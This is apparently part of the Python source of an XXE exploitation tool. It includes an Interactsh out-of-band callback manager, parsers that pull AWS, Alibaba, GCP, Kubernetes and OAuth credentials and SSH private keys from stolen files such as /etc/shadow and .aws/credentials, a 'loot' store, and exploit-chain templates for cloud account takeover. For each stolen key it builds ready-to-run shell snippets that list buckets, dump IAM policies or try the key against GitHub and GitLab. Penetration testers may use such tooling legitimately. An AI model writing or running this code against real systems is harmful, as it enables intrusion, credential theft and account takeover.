def _normalize_oob_domain(raw: Optional[str]) -> str:
    if not raw:
        return ""
    d = raw.strip()
    for scheme in ("https://", "http://"):
        if d.lower().startswith(scheme):
            d = d[len(scheme):]
            break
    d = d.split("/", 1)[0].split("?", 1)[0].split("#", 1)[0]
    if "@" in d:
        d = d.rsplit("@", 1)[1]
    if not d.startswith("[") and ":" in d:
        d = d.rsplit(":", 1)[0]
    d = d.rstrip(".").lower()
    return d if "." in d else ""


# ---------------------------------------------------------------------------
# Interactsh subprocess manager (used only with --oob-auto)
# ---------------------------------------------------------------------------

class InteractshManager:
    DOMAIN_RE = re.compile(
        r"\b([a-z0-9]{20,40}\.[a-z0-9][a-z0-9.-]{3,})\b",
        re.IGNORECASE,
    )

    def __init__(self,
                 extra_args: Optional[List[str]] = None,
                 startup_timeout: float = 20.0):
        self.proc: Optional[subprocess.Popen] = None
        self.domain: str = ""
        self.extra_args = list(extra_args or [])
        self.startup_timeout = startup_timeout
        self._lock = threading.Lock()
        self._callbacks: List[Dict[str, Any]] = []
        self._ready = threading.Event()
        self._stop = threading.Event()
        self._reader_thread: Optional[threading.Thread] = None

    def start(self) -> str:
        cmd = ["interactsh-client", "-json", "-v", *self.extra_args]
        try:
            self.proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
        except FileNotFoundError:
            raise RuntimeError(
                "interactsh-client not found in PATH. "
                "Install from https://github.com/projectdiscovery/interactsh"
            )
        except Exception as e:
            raise RuntimeError(f"failed to spawn interactsh-client: {e}")

        self._reader_thread = threading.Thread(
            target=self._reader_loop,
            name="interactsh-reader",
            daemon=True,
        )
        self._reader_thread.start()

        if not self._ready.wait(timeout=self.startup_timeout):
            self.stop()
            raise RuntimeError(
                f"interactsh-client did not report a session domain "
                f"within {self.startup_timeout:.0f}s"
            )
        return self.domain

    def _reader_loop(self):
        assert self.proc is not None
        assert self.proc.stdout is not None

        for raw in self.proc.stdout:
            if self._stop.is_set():
                break
            line = raw.strip()
            if not line:
                continue

            if line.startswith("{"):
                try:
                    obj = json.loads(line)
                except json.JSONDecodeError:
                    continue
                with self._lock:
                    self._callbacks.append(obj)
                fid = (obj.get("full-id")
                       or obj.get("unique-id")
                       or obj.get("subdomain")
                       or "?")
                proto = obj.get("protocol", "?")
                remote = obj.get("remote-address", "?")
                print(f"  [OOB-CALLBACK] {proto} {fid} from {remote}",
                      file=sys.stderr, flush=True)
                continue

            if not self._ready.is_set():
                m = self.DOMAIN_RE.search(line)
                if m:
                    with self._lock:
                        self.domain = m.group(1).lower()
                    self._ready.set()

    def callbacks(self) -> List[Dict[str, Any]]:
        with self._lock:
            return list(self._callbacks)

    def stop(self):
        self._stop.set()
        if self.proc is not None:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                try:
                    self.proc.kill()
                except Exception:
                    pass
            except Exception:
                pass
        if self._reader_thread is not None:
            self._reader_thread.join(timeout=2)


# ---------------------------------------------------------------------------
# Universal extraction: loot store, file content extractor, credential
# extractor, chain tracker
# ---------------------------------------------------------------------------

@dataclass
class Credential:
    kind: str
    raw: str
    fields: Dict[str, str] = field(default_factory=dict)
    snippets: List[Dict[str, str]] = field(default_factory=list)
    source: str = ""
    confidence: int = 50

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


class CredentialExtractor:
    AWS_JSON_RE = re.compile(
        r'"AccessKeyId"\s*:\s*"(?P<ak>[A-Z0-9]{16,32})"'
        r'.{0,400}?'
        r'"SecretAccessKey"\s*:\s*"(?P<sk>[A-Za-z0-9/+=]{30,})"'
        r'(?:.{0,400}?"Token"\s*:\s*"(?P<tok>[A-Za-z0-9/+=._-]{100,})")?',
        re.DOTALL,
    )

    AWS_INI_RE = re.compile(
        r'aws_access_key_id\s*=\s*(?P<ak>[A-Z0-9]{16,32})'
        r'[\s\S]{0,200}?'
        r'aws_secret_access_key\s*=\s*(?P<sk>[A-Za-z0-9/+=]{30,})'
        r'(?:[\s\S]{0,200}?'
        r'aws_session_token\s*=\s*(?P<tok>[A-Za-z0-9/+=._-]{100,}))?',
    )

    SSH_KEY_RE = re.compile(
        r"-----BEGIN (?:RSA|OPENSSH|DSA|EC|PRIVATE) PRIVATE KEY-----"
        r"[\s\S]+?"
        r"-----END (?:RSA|OPENSSH|DSA|EC|PRIVATE) PRIVATE KEY-----"
    )

    GCP_SA_RE = re.compile(
        r'"type"\s*:\s*"service_account"[\s\S]{0,2000}?'
        r'"private_key_id"\s*:\s*"([a-f0-9]{32,})"',
        re.IGNORECASE,
    )

    GENERIC_BEARER_RE = re.compile(
        r'(?:Authorization|Bearer)\s*[:=]?\s*([A-Za-z0-9._\-]{24,})',
        re.IGNORECASE,
    )

    OAUTH_TOKEN_RE = re.compile(
        r'"access_token"\s*:\s*"(?P<tok>[A-Za-z0-9_\-\.]+)"'
        r'(?:[\s\S]{0,200}?"expires_in"\s*:?\s*"?(?P<exp_in>\d+)"?)?'
        r'(?:[\s\S]{0,200}?"expires_on"\s*:\s*"(?P<exp_on>\d+)")?',
        re.DOTALL,
    )

    ALIBABA_RAM_RE = re.compile(
        r'"AccessKeyId"\s*:\s*"(?P<ak>(?:STS|LTAI)[A-Za-z0-9.]{16,32})"'
        r'[\s\S]{0,400}?'
        r'"AccessKeySecret"\s*:\s*"(?P<sk>[A-Za-z0-9/+=]{20,})"'
        r'(?:[\s\S]{0,400}?'
        r'"SecurityToken"\s*:\s*"(?P<tok>[A-Za-z0-9/+=._\-]{50,})")?',
        re.DOTALL,
    )

    K8S_SA_TOKEN_RE = re.compile(
        r'"token"\s*:\s*"(?P<b64>[A-Za-z0-9+/=]{80,})"',
    )

    JWT_RE = re.compile(
        r'\b(?P<jwt>eyJ[A-Za-z0-9_\-]{10,}'
        r'\.[A-Za-z0-9_\-]{10,}'
        r'\.[A-Za-z0-9_\-]{10,})\b'
    )

    @classmethod
    def extract_all(cls, text: str, source: str = "") -> List[Credential]:
        if not text:
            return []
        out: List[Credential] = []
        out.extend(cls._aws_iam_json(text, source))
        out.extend(cls._aws_ini(text, source))
        out.extend(cls._alibaba_ram(text, source))
        out.extend(cls._ssh_keys(text, source))
        out.extend(cls._gcp_sa(text, source))
        out.extend(cls._oauth_tokens(text, source))
        out.extend(cls._k8s_sa_tokens(text, source))
        out.extend(cls._raw_jwts(text, source))
        out.extend(cls._generic_bearers(text, source))
        return cls._dedupe(out)

    @classmethod
    def _aws_iam_json(cls, text: str, source: str) -> List[Credential]:
        results = []
        for m in cls.AWS_JSON_RE.finditer(text):
            results.append(cls._make_aws_cred(
                m.group("ak"), m.group("sk"), m.group("tok") or "",
                source, confidence=95,
            ))
        return results

    @classmethod
    def _aws_ini(cls, text: str, source: str) -> List[Credential]:
        results = []
        for m in cls.AWS_INI_RE.finditer(text):
            results.append(cls._make_aws_cred(
                m.group("ak"), m.group("sk"), m.group("tok") or "",
                source, confidence=90,
            ))
        return results

    @staticmethod
    def _make_aws_cred(ak: str, sk: str, tok: str,
                       source: str, confidence: int) -> Credential:
        env_prefix = (
            f"AWS_ACCESS_KEY_ID='{ak}' \\\n"
            f"AWS_SECRET_ACCESS_KEY='{sk}'"
            + (f" \\\nAWS_SESSION_TOKEN='{tok}'" if tok else "")
        )
        export_lines = (
            f"export AWS_ACCESS_KEY_ID='{ak}'\n"
            f"export AWS_SECRET_ACCESS_KEY='{sk}'"
            + (f"\nexport AWS_SESSION_TOKEN='{tok}'" if tok else "")
        )
        snippets = [
            {"label": "Verify identity (does the key still work?)",
             "shell": f"{env_prefix} \\\naws sts get-caller-identity"},
            {"label": "List S3 buckets",
             "shell": f"{env_prefix} \\\naws s3 ls"},
            {"label": "Dump IAM policies for this principal",
             "shell": (
                 f"{env_prefix} \\\n"
                 f"aws iam list-attached-user-policies --user-name "
                 f"$(aws sts get-caller-identity --query Arn "
                 f"--output text | cut -d/ -f2)"
             )},
            {"label": "Environment (paste into current shell)",
             "shell": export_lines},
        ]
        fields = {"AccessKeyId": ak, "SecretAccessKey": sk}
        if tok:
            fields["SessionToken"] = tok
        return Credential(
            kind="aws_iam",
            raw=f"AccessKeyId={ak} SecretAccessKey={sk}"
                + (f" SessionToken={tok}" if tok else ""),
            fields=fields,
            snippets=snippets,
            source=source,
            confidence=confidence,
        )

    @classmethod
    def _ssh_keys(cls, text: str, source: str) -> List[Credential]:
        results = []
        for m in cls.SSH_KEY_RE.finditer(text):
            key = m.group(0)
            key_type = "unknown"
            for t in ("OPENSSH", "RSA", "EC", "DSA", "PRIVATE"):
                if f"BEGIN {t} PRIVATE KEY" in key:
                    key_type = t.lower()
                    break
            fp = hashlib.sha1(key.encode()).hexdigest()[:16]
            snippets = [
                {"label": "Install + fingerprint",
                 "shell": (
                     f"cat > /tmp/xxeripper_key <<'EOF'\n{key}\nEOF\n"
                     f"chmod 600 /tmp/xxeripper_key\n"
                     f"ssh-keygen -y -f /tmp/xxeripper_key "
                     f"> /tmp/xxeripper_key.pub\n"
                     f"cat /tmp/xxeripper_key.pub"
                 )},
                {"label": "Try against common SSH hosts",
                 "shell": (
                     "for h in github.com gitlab.com bitbucket.org; do\n"
                     "  ssh -i /tmp/xxeripper_key "
                     "-o StrictHostKeyChecking=no "
                     "-o ConnectTimeout=5 -T git@$h 2>&1 | head -1\n"
                     "done"
                 )},
            ]
            results.append(Credential(
                kind="ssh_private_key",
                raw=key,
                fields={"type": key_type, "sha256_fingerprint": fp,
                        "bits": str(len(key))},
                snippets=snippets,
                source=source,
                confidence=90,
            ))
        return results

    @classmethod
    def _gcp_sa(cls, text: str, source: str) -> List[Credential]:
        results = []
        for m in cls.GCP_SA_RE.finditer(text):
            results.append(Credential(
                kind="gcp_service_account",
                raw=text[m.start():m.end()],
                fields={"private_key_id": m.group(1)},
                snippets=[{
                    "label": "Activate service-account key",
                    "shell": (
                        "cat > /tmp/gcp-sa.json <<'EOF'\n"
                        f"{text[m.start():m.end()]}\nEOF\n"
                        "gcloud auth activate-service-account "
                        "--key-file=/tmp/gcp-sa.json"
                    ),
                }],
                source=source, confidence=85,
            ))
        return results

    @classmethod
    def _oauth_tokens(cls, text: str, source: str) -> List[Credential]:
        results: List[Credential] = []
        seen_tokens: Set[str] = set()

        for m in cls.OAUTH_TOKEN_RE.finditer(text):
            token = m.group("tok")
            if token in seen_tokens:
                continue
            seen_tokens.add(token)

            expires_in = m.group("exp_in")
            expires_on = m.group("exp_on")
            if expires_in:
                expiry = f"in {expires_in}s"
            elif expires_on:
                expiry = f"at epoch {expires_on}"
            else:
                expiry = "unknown"

            results.append(Credential(
                kind="oauth_token",
                raw=f"access_token={token}"
                    + (f" expires={expiry}" if expiry != "unknown" else ""),
                fields={
                    "access_token": token,
                    "expires": expiry,
                },
                snippets=[
                    {"label": "Verify against Google userinfo "
                              "(works for GCP tokens)",
                     "shell": (
                         f"curl -sS -H 'Authorization: Bearer {token}' "
                         f"https://www.googleapis.com/oauth2/v1/userinfo"
                     )},
                    {"label": "List Azure subscriptions "
                              "(works for Azure tokens)",
                     "shell": (
                         f"curl -sS -H 'Authorization: Bearer {token}' "
                         f"'https://management.azure.com/subscriptions"
                         f"?api-version=2020-01-01'"
                     )},
                ],
                source=source,
                confidence=85,
            ))
        return results

    @classmethod
    def _alibaba_ram(cls, text: str, source: str) -> List[Credential]:
        results: List[Credential] = []
        for m in cls.ALIBABA_RAM_RE.finditer(text):
            ak = m.group("ak")
            sk = m.group("sk")
            tok = m.group("tok") or ""

            env_prefix = (
                f"ALIBABA_CLOUD_ACCESS_KEY_ID='{ak}' \\\n"
                f"ALIBABA_CLOUD_ACCESS_KEY_SECRET='{sk}'"
                + (f" \\\nALIBABA_CLOUD_SECURITY_TOKEN='{tok}'"
                   if tok else "")
            )
            results.append(Credential(
                kind="alibaba_ram",
                raw=f"AccessKeyId={ak} AccessKeySecret={sk}"
                    + (f" SecurityToken={tok}" if tok else ""),
                fields={
                    "AccessKeyId": ak,
                    "AccessKeySecret": sk,
                    **({"SecurityToken": tok} if tok else {}),
                },
                snippets=[
                    {"label": "Verify identity with aliyun CLI",
                     "shell": (
                         f"{env_prefix} \\\n"
                         f"aliyun sts GetCallerIdentity"
                     )},
                    {"label": "List OSS buckets",
                     "shell": (
                         f"{env_prefix} \\\n"
                         f"aliyun oss ls"
                     )},
                    {"label": "Environment (paste into current shell)",
                     "shell": (
                         f"export ALIBABA_CLOUD_ACCESS_KEY_ID='{ak}'\n"
                         f"export ALIBABA_CLOUD_ACCESS_KEY_SECRET='{sk}'"
                         + (f"\nexport ALIBABA_CLOUD_SECURITY_TOKEN='{tok}'"
                            if tok else "")
                     )},
                ],
                source=source,
                confidence=90,
            ))
        return results

    @classmethod
    def _k8s_sa_tokens(cls, text: str, source: str) -> List[Credential]:
        results: List[Credential] = []
        seen_jwts: Set[str] = set()

        for m in cls.K8S_SA_TOKEN_RE.finditer(text):
            b64 = m.group("b64")
            try:
                decoded = base64.b64decode(b64, validate=True) \
                                .decode("utf-8", errors="strict")
            except (binascii.Error, ValueError, UnicodeDecodeError):
                continue
            if not decoded.startswith("eyJ") or decoded.count(".") != 2:
                continue
            if decoded in seen_jwts:
                continue
            seen_jwts.add(decoded)
            results.append(cls._make_k8s_cred(decoded, source))
        return results

    @classmethod
    def _raw_jwts(cls, text: str, source: str) -> List[Credential]:
        results: List[Credential] = []
        seen: Set[str] = set()
        for m in cls.JWT_RE.finditer(text):
            jwt = m.group("jwt")
            if jwt in seen:
                continue
            seen.add(jwt)
            results.append(cls._make_k8s_cred(jwt, source))
        return results

    @staticmethod
    def _make_k8s_cred(jwt: str, source: str) -> Credential:
        namespace = "default"
        sa_name = "unknown"

        try:
            payload_b64 = jwt.split(".")[1]
            pad = "=" * (-len(payload_b64) % 4)
            payload = json.loads(
                base64.urlsafe_b64decode(payload_b64 + pad)
                .decode("utf-8", errors="replace"))

            k8s_claim = payload.get("kubernetes.io")
            if isinstance(k8s_claim, dict):
                ns = k8s_claim.get("namespace")
                if isinstance(ns, str) and ns:
                    namespace = ns
                sa = k8s_claim.get("serviceaccount")
                if isinstance(sa, dict):
                    name = sa.get("name")
                    if isinstance(name, str) and name:
                        sa_name = name

            if sa_name == "unknown" or namespace == "default":
                sub = payload.get("sub", "")
                m = re.match(
                    r"system:serviceaccount:([^:]+):([^:]+)", sub)
                if m:
                    namespace = m.group(1)
                    sa_name = m.group(2)
        except Exception:
            pass

        fp = hashlib.sha1(jwt.encode()).hexdigest()[:16]
        return Credential(
            kind="k8s_sa_token",
            raw=jwt,
            fields={
                "namespace": namespace,
                "service_account": sa_name,
                "sha1_fingerprint": fp,
                "length": str(len(jwt)),
            },
            snippets=[
            ],
            source=source,
            confidence=90,
        )

    @classmethod
    def _generic_bearers(cls, text: str, source: str) -> List[Credential]:
        results: List[Credential] = []
        seen_tokens: Set[str] = set()
        for m in cls.GENERIC_BEARER_RE.finditer(text):
            token = m.group(1)
            if token in seen_tokens:
                continue
            seen_tokens.add(token)
            if token.startswith(("AKIA", "ASIA", "AROA")):
                continue
            results.append(Credential(
                kind="generic_bearer",
                raw=token,
                fields={
                    "token_prefix": token[:8],
                    "length": str(len(token)),
                },
                snippets=[{
                    "label": "Test as a bearer token",
                    "shell": (
                        f"curl -sS -H 'Authorization: Bearer {token}' "
                        f"https://httpbin.org/bearer"
                    ),
                }],
                source=source,
                confidence=40,
            ))
        return results

    @staticmethod
    def _dedupe(creds: List[Credential]) -> List[Credential]:
        seen: Set[str] = set()
        out = []
        for c in creds:
            key = f"{c.kind}:{hashlib.sha1(c.raw.encode()).hexdigest()}"
            if key in seen:
                continue
            seen.add(key)
            out.append(c)
        return out


class FileContentExtractor:

    @classmethod
    def extract(cls, body: str, file_path: str,
                fingerprint_type: Optional[str]) -> Optional[str]:
        if not body or len(body) < 8:
            return None

        for key in (file_path, fingerprint_type):
            if not key:
                continue
            fn = cls._map().get(key)
            if fn:
                result = fn(body)
                if result and len(result.strip()) >= 8:
                    return result.strip()

        for prefix, fn in cls._prefixes():
            if file_path.startswith(prefix):
                result = fn(body)
                if result and len(result.strip()) >= 8:
                    return result.strip()

        return cls._generic(body)

    @staticmethod
    def _passwd(body: str) -> Optional[str]:
        line_starts = re.findall(
            r'(?m)^[a-z_][a-z0-9_-]*:[^:\n]*:\d+:\d+:[^:\n]*:[^:\n]*:[^\n]*$',
            body,
        )
        if len(line_starts) >= 3:
            return "\n".join(line_starts)

        mid = re.findall(
            r'(?:^|[/\s"\'])([a-z_][a-z0-9_-]*:[^:\n\s/]*:\d+:\d+:[^:\n]*:[^:\n]*:[^\n\s]*)(?=$|[/\s"\'])',
            body,
            re.MULTILINE,
        )
        if len(mid) >= 2:
            return "\n".join(mid)
        return None

    @staticmethod
    def _shadow(body: str) -> Optional[str]:
        lines = re.findall(
            r'(?m)^[a-z_][a-z0-9_-]*:[\$\*!][^:\n]*:[^\n]*$', body)
        if len(lines) >= 1:
            return "\n".join(lines)
        return None

    @staticmethod
    def _ssh_key(body: str) -> Optional[str]:
        m = re.search(
            r'-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]+?'
            r'-----END [A-Z ]*PRIVATE KEY-----',
            body,
        )
        return m.group(0) if m else None

    @staticmethod
    def _aws_creds(body: str) -> Optional[str]:
        m = re.search(
            r'(?:\[[\w\-]+\]\s*\n)?'
            r'aws_access_key_id\s*=\s*\S+[\s\S]{0,200}?'
            r'aws_secret_access_key\s*=\s*\S+',
            body,
        )
        return m.group(0) if m else None

    @staticmethod
    def _env_file(body: str) -> Optional[str]:
        lines = re.findall(
            r'(?m)^[A-Z_][A-Z0-9_]*\s*=\s*.*$', body)
        if len(lines) >= 2:
            return "\n".join(lines)
        return None

    @staticmethod
    def _ini_file(body: str) -> Optional[str]:
        kept = []
        for line in body.splitlines():
            if re.match(r'^\s*[\[;#]', line) \
               or re.match(r'^\s*[A-Za-z_][\w\.\-]*\s*=', line) \
               or line.strip() == "":
                kept.append(line)
        if len(kept) >= 3:
            return "\n".join(kept).strip()
        return None

    @staticmethod
    def _php_source(body: str) -> Optional[str]:
        m = re.search(r'<\?php[\s\S]+?(?:\?>|$)', body)
        return m.group(0) if m else None

    @staticmethod
    def _web_config(body: str) -> Optional[str]:
        m = re.search(
            r'(<\?xml[^>]*\?>\s*)?<configuration[\s\S]+?</configuration>',
            body,
        )
        return m.group(0) if m else None

    @staticmethod
    def _proc_style(body: str) -> Optional[str]:
        if "\x00" in body:
            return body.replace("\x00", "\n").strip()
        lines = re.findall(r'(?m)^[A-Z_][A-Z0-9_]*=.*$', body)
        if len(lines) >= 2:
            return "\n".join(lines)
        return None

    @staticmethod
    def _generic(body: str) -> Optional[str]:
        if not AccuracyEngine.looks_like_markup(body):
            return body[:8192].strip() or None
        m = re.search(
            r'<(?:pre|textarea|code)[^>]*>([\s\S]+?)'
            r'</(?:pre|textarea|code)>',
            body, re.IGNORECASE,
        )
        if m:
            inner = m.group(1)
            try:
                inner = unquote(inner)
            except Exception:
                pass
            return inner.strip() or None
        return None

    @classmethod
    def _map(cls) -> Dict[str, Any]:
        return {
            "/etc/passwd":       cls._passwd,
            "/etc/shadow":       cls._shadow,
            "ssh_private_key":   cls._ssh_key,
            "aws_credentials":   cls._aws_creds,
            ".env":              cls._env_file,
            "php_source":        cls._php_source,
            "win.ini":           cls._ini_file,
            "system.ini":        cls._ini_file,
            "boot.ini":          cls._ini_file,
            "web.config":        cls._web_config,
            "proc_environ":      cls._proc_style,
        }

    @classmethod
    def _prefixes(cls) -> List[Tuple[str, Any]]:
        return [
            ("/etc/passwd",         cls._passwd),
            ("/etc/shadow",         cls._shadow),
            (".ssh/id_",            cls._ssh_key),
            (".aws/credentials",    cls._aws_creds),
            ("/.env",               cls._env_file),
            ("/proc/",              cls._proc_style),
            ("win.ini",             cls._ini_file),
            ("system.ini",          cls._ini_file),
            ("boot.ini",            cls._ini_file),
            ("web.config",          cls._web_config),
        ]


class LootStore:
    def __init__(self):
        self._lock = threading.Lock()
        self._entries: Dict[str, Dict[str, Any]] = {}
        self._by_url: Dict[str, List[str]] = {}

    MAX_CONTENT_BYTES = 256 * 1024

    def add_file(self, *, target_url: str, source_path: str,
                 technique: str, content: str,
                 indicators: List[str]) -> str:
        content = (content or "").strip()
        if not content:
            return ""
        creds = [c.to_dict() for c in
                 CredentialExtractor.extract_all(
                     content, source=source_path)]
        truncated = False
        if len(content) > self.MAX_CONTENT_BYTES:
            content = content[:self.MAX_CONTENT_BYTES]
            truncated = True
        digest = hashlib.sha256(
            content.encode("utf-8", errors="ignore")).hexdigest()
        key = f"file:{digest[:16]}"
        with self._lock:
            if key in self._entries:
                return key
            self._entries[key] = {
                "id": key,
                "kind": "file",
                "source_path": source_path,
                "source_url": target_url,
                "technique": technique,
                "content": content,
                "size": len(content),
                "truncated": truncated,
                "sha256": digest,
                "indicators": list(indicators or []),
                "credentials": creds,
                "ts": time.time(),
            }
            self._by_url.setdefault(target_url, []).append(key)
        return key

    def add_secret(self, *, target_url: str, technique: str,
                   kind: str, raw: str,
                   fields: Dict[str, str],
                   snippets: List[Dict[str, str]]) -> str:
        digest = hashlib.sha256(
            (raw or "").encode("utf-8", errors="ignore")).hexdigest()
        key = f"secret:{digest[:16]}"
        with self._lock:
            if key in self._entries:
                return key
            self._entries[key] = {
                "id": key,
                "kind": kind,
                "source_url": target_url,
                "technique": technique,
                "content": raw,
                "fields": dict(fields or {}),
                "snippets": list(snippets or []),
                "size": len(raw or ""),
                "sha256": digest,
                "ts": time.time(),
            }
            self._by_url.setdefault(target_url, []).append(key)
        return key

    def get(self, key: str) -> Optional[Dict[str, Any]]:
        with self._lock:
            e = self._entries.get(key)
            return dict(e) if e else None

    def preview(self, key: str, chars: int = 500) -> str:
        e = self.get(key)
        if not e:
            return ""
        content = e.get("content", "") or ""
        return content if len(content) <= chars \
            else content[:chars] + "…"

    def credentials(self, key: str) -> List[Dict[str, Any]]:
        e = self.get(key)
        return list(e.get("credentials") or []) if e else []

    def all(self) -> List[Dict[str, Any]]:
        with self._lock:
            return [dict(e) for e in self._entries.values()]

    def counts(self) -> Dict[str, int]:
        with self._lock:
            total = len(self._entries)
            files = sum(1 for e in self._entries.values()
                        if e.get("kind") == "file")
            secrets = sum(1 for e in self._entries.values()
                        if e.get("kind") in (
                            "aws_iam", "ssh_private_key",
                            "gcp_service_account", "generic_bearer",
                            "oauth_token", "alibaba_ram", "k8s_sa_token"))
            return {"total": total, "files": files, "secrets": secrets}


# ---------------------------------------------------------------------------
# Chain tracker, and templates
# ---------------------------------------------------------------------------

CHAIN_TEMPLATES = [
    {
        "id": "xxe_inband_file_credential_theft",
        "title": "XXE → in-band file read → credential theft",
        "required": ["xxe_confirmed", "file_content_recovered",
                     "credential_extracted"],
        "severity": "CRITICAL",
        "impact": "Live credentials recovered from the server filesystem",
    },
    {
        "id": "xxe_imds_iam_aws_takeover",
        "title": "XXE → IMDS → IAM credentials → AWS account takeover",
        "required": ["xxe_confirmed", "ssrf_metadata_reachable",
                     "iam_credentials_extracted"],
        "severity": "CRITICAL",
        "impact": "AWS account takeover via instance-role credentials",
    },
    {
        "id": "xxe_error_based_file_recovery",
        "title": "XXE → error-based leak → file content recovered",
        "required": ["xxe_confirmed", "error_based_leak",
                     "file_content_recovered"],
        "severity": "HIGH",
        "impact": "File content recovered through the parser error channel",
    },
    {
        "id": "xxe_php_source_disclosure",
        "title": "XXE → PHP filter chain → source disclosure",
        "required": ["xxe_confirmed", "php_filter_source_leak"],
        "severity": "CRITICAL",
        "impact": "Application source code recovered",
    },
    {
        "id": "xxe_rce_chain",
        "title": "XXE → protocol wrapper → RCE chain confirmed",
        "required": ["xxe_confirmed", "rce_wrapper_resolved"],
        "severity": "CRITICAL",
        "impact": "Command execution or arbitrary file access via wrapper",
    },
    {
        "id": "xxe_blind_oob_confirmed",
        "title": "XXE → blind OOB callback confirmed",
        "required": ["xxe_confirmed", "oob_callback_correlated"],
        "severity": "HIGH",
        "impact": "Blind XXE proven exploitable via out-of-band interaction",
    },
    {
        "id": "xxe_ssrf_internal_enum",
        "title": "XXE → SSRF → internal service reached",
        "required": ["xxe_confirmed", "ssrf_metadata_reachable"],
        "severity": "HIGH",
        "impact": "SSRF primitive reaching internal services",
    },
    {
        "id": "xxe_waf_bypass_confirmed",
        "title": "XXE → WAF bypass → entity resolution confirmed",
        "required": ["xxe_confirmed", "waf_bypass_success"],
        "severity": "HIGH",
        "impact": "Input filter bypass leading to XXE",
    },
    {
        "id": "xxe_kubernetes_cluster_takeover",
        "title": "XXE → Kubernetes secrets API → cluster credential theft",
        "required": ["xxe_confirmed", "k8s_secrets_reachable"],
        "severity": "CRITICAL",
        "impact": "Kubernetes service-account or cluster secrets "
                  "recovered — potential cluster-admin or lateral pod "
                  "compromise",
    },
    {
        "id": "xxe_k8s_serviceaccount_token",
        "title": "XXE → Kubernetes service-account token read",
        "required": ["xxe_confirmed", "file_content_recovered",
                     "k8s_sa_token_extracted"],
        "severity": "CRITICAL",
        "impact": "In-cluster service-account token recovered — "
                  "lateral movement against the Kubernetes API",
    },
    {
        "id": "xxe_ssh_key_lateral_movement",
        "title": "XXE → SSH private key → lateral movement primitive",
        "required": ["xxe_confirmed", "file_content_recovered",
                     "ssh_key_extracted"],
        "severity": "HIGH",
        "impact": "SSH private key recovered from the target "
                  "filesystem — enables SSH authentication against "
                  "trusted hosts",
    },
    {
        "id": "xxe_gcp_oauth_token_extraction",
        "title": "XXE → GCP metadata → OAuth token extraction",
        "required": ["xxe_confirmed", "gcp_token_extracted"],
        "severity": "CRITICAL",
        "impact": "GCP service-account access token recovered — "
                  "project-level access via gcloud",
    },
    {
        "id": "xxe_azure_managed_identity",
        "title": "XXE → Azure IMDS → managed-identity token",
        "required": ["xxe_confirmed", "azure_token_extracted"],
        "severity": "CRITICAL",
        "impact": "Azure managed-identity token recovered — "
                  "subscription-level access via az CLI",
    },
]


class ChainTracker:
    """Records chain stages and fires rollups when templates complete."""

    def __init__(self):
        self._lock = threading.Lock()
        self._stages: List[Dict[str, Any]] = []
        self._fired: Set[str] = set()

    def record(self, stage: str, evidence: Dict[str, Any],
               url: str = ""):
        if not stage:
            return
        with self._lock:
            for s in self._stages:
                if s["stage"] == stage and s["evidence"] == evidence:
                    return
            self._stages.append({
                "stage": stage,
                "evidence": dict(evidence or {}),
                "url": url,
                "ts": time.time(),
            })

    def completed_chains(self) -> List[Dict[str, Any]]:
        out: List[Dict[str, Any]] = []
        with self._lock:
            stages = list(self._stages)
            present = {s["stage"] for s in stages}
            for tmpl in CHAIN_TEMPLATES:
                if tmpl["id"] in self._fired:
                    continue
                if not all(r in present for r in tmpl["required"]):
                    continue
                ordered: List[Dict[str, Any]] = []
                for req in tmpl["required"]:
                    match = next(
                        (s for s in stages if s["stage"] == req), None)
                    if match:
                        ordered.append(match)
                self._fired.add(tmpl["id"])
                out.append({
                    "id": tmpl["id"],
                    "title": tmpl["title"],
                    "required": tmpl["required"],
                    "severity": tmpl["severity"],
                    "impact": tmpl["impact"],
                    "steps": ordered,
                })
        return out

    def emit_rollup_findings(self, detector: "XXEDetector"):
        for chain in self.completed_chains():
            fid = "XXE-CHAIN-" + re.sub(
                r"[^A-Z0-9]+", "-", chain["id"].upper()
            ).strip("-")[:60]
            path = " → ".join(s["stage"] for s in chain["steps"])
            detector.add_finding(
                fid, chain["severity"],
                f"Exploit chain confirmed: {chain['title']}",
                f"A {len(chain['required'])}-stage exploit chain "
                f"completed end-to-end. Path: {path}",
                chain["impact"],
                confirmed=True, exploitability="confirmed",
                evidence={
                    "chain_id": chain["id"],
                    "chain_length": len(chain["required"]),
                    "steps": [
                        {
                            "stage": s["stage"],
                            "evidence": s["evidence"],
                            "ts": s["ts"],
                        }
                        for s in chain["steps"]
                    ],
                    "score": 100,
                },
                reasons=[
                    f"Chain '{chain['id']}' completed "
                    f"({len(chain['required'])} stages): {path}"
                ],
                confidence=100,
            )


# ---------------------------------------------------------------------------
# OOB Client (crypto-correlated, Future-based)
# ---------------------------------------------------------------------------

class OOBClient:

    def __init__(self, domain: str = "",
                 manager: Optional[InteractshManager] = None):
        if manager is not None:
            self._manager = manager
            self.server = manager.domain
            self.auto_mode = True
        else:
            self._manager = None
            self.server = _normalize_oob_domain(domain) or domain.strip()
            self.auto_mode = False
        self._lock = threading.Lock()
        self._pending_tokens: Dict[str, str] = {}
        self._announced: Set[str] = set()
        self.payloads_sent: int = 0
        self.subdomains: List[str] = []
        self.observations: List[Dict[str, str]] = []
        self._consumed_callbacks: Set[str] = set()

    def record_observation(self, technique: str,
                           subdomain: str,
                           note: str) -> None:
        with self._lock:
            self.observations.append({
                "technique": technique,
                "subdomain": subdomain,
                "note": note,
                "correlated": None,
                "exfil_preview": None,
                "loot_id": None,
            })

    def mark_observation_correlated(self, subdomain: str,
                                    correlated: bool) -> None:
        with self._lock:
            for obs in self.observations:
                if obs["subdomain"] == subdomain:
                    obs["correlated"] = bool(correlated)
                    return

    def mark_observation_exfiltrated(self, subdomain: str,
                                     preview: str,
                                     loot_id: str) -> None:
        with self._lock:
            for obs in self.observations:
                if obs["subdomain"] == subdomain:
                    obs["exfil_preview"] = preview
                    obs["loot_id"] = loot_id
                    return

    def stats(self) -> Dict[str, Any]:
        with self._lock:
            return {
                "payloads_sent": self.payloads_sent,
                "subdomains": list(self.subdomains),
                "observations": list(self.observations),
            }

    def generate_correlated_subdomain(self, label: str) -> Tuple[str, str]:
        token = uuid.uuid4().hex[:16]
        safe_label = re.sub(r"[^a-z0-9-]", "-", label.lower())[:30]
        subdomain = f"{safe_label}-{token}.{self.server}"
        with self._lock:
            self._pending_tokens[token] = label
            if subdomain not in self._announced:
                self._announced.add(subdomain)
